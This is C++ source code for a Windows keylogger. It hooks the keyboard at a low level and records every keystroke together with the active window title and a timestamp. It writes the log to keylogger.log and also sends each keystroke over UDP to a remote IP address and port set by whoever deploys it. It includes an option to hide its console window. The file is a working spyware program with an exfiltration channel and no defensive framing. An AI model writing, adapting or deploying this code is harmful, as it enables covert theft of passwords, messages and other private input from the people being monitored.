#define UNICODE
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>

#pragma comment(lib, "Ws2_32.lib")

// IP and port for sending keystrokes
const char* DEST_IP = "your.public.ip.address"; // replace with actual IP
const int DEST_PORT = 3444;

#define visible
#define bootwait
#define FORMAT 0
#define mouseignore

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]"},
    {VK_RETURN, "\n"},
    {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"},
    {VK_OEM_PERIOD, "."},
    {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"},
    {VK_OEM_MINUS, "-"},
    {VK_ADD, "+"},
    {VK_SUBTRACT, "-"},
    {VK_CAPITAL, "[CAPSLOCK]"},
};
#endif

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
std::ofstream output_file;

// Socket for sending UDP messages
SOCKET udpSocket;

// Function to initialize the UDP socket
bool InitializeSocket() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return false;
    }

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create UDP socket." << std::endl;
        WSACleanup();
        return false;
    }
    return true;
}

// Function to close the socket
void CloseSocket() {
    closesocket(udpSocket);
    WSACleanup();
}

// This function sends the keystroke data over UDP
void SendKeystrokeData(const std::string& data) {
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEST_PORT);
    inet_pton(AF_INET, DEST_IP, &serverAddr.sin_addr);

    sendto(udpSocket, data.c_str(), data.size(), 0, (sockaddr*)&serverAddr, sizeof(serverAddr));
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        Save(kbdStruct.vkCode);
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook() {
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke) {
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2)) {
        return 0;
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground) {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0) {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);

            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end()) {
        output << keyname.at(key_stroke);
    } else {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
        if (!lowercase) {
            key = tolower(key);
        }
        output << char(key);
    }
#endif

    output_file << output.str();
    output_file.flush();
    std::cout << output.str();

    // Send the keystroke data over UDP
    SendKeystrokeData(output.str());

    return 0;
}

void Stealth() {
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif
#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

bool IsSystemBooting() {
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

int main() {
    Stealth();

#ifdef bootwait
    while (IsSystemBooting()) {
        std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
        Sleep(10000);
    }
#endif

    const char* output_filename = "keylogger.log";
    std::cout << "Logging output to " << output_filename << std::endl;
    output_file.open(output_filename, std::ios_base::app);

    if (!InitializeSocket()) {
        std::cerr << "Failed to initialize UDP socket. Exiting." << std::endl;
        return -1;
    }

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    CloseSocket();
    return 0;
}
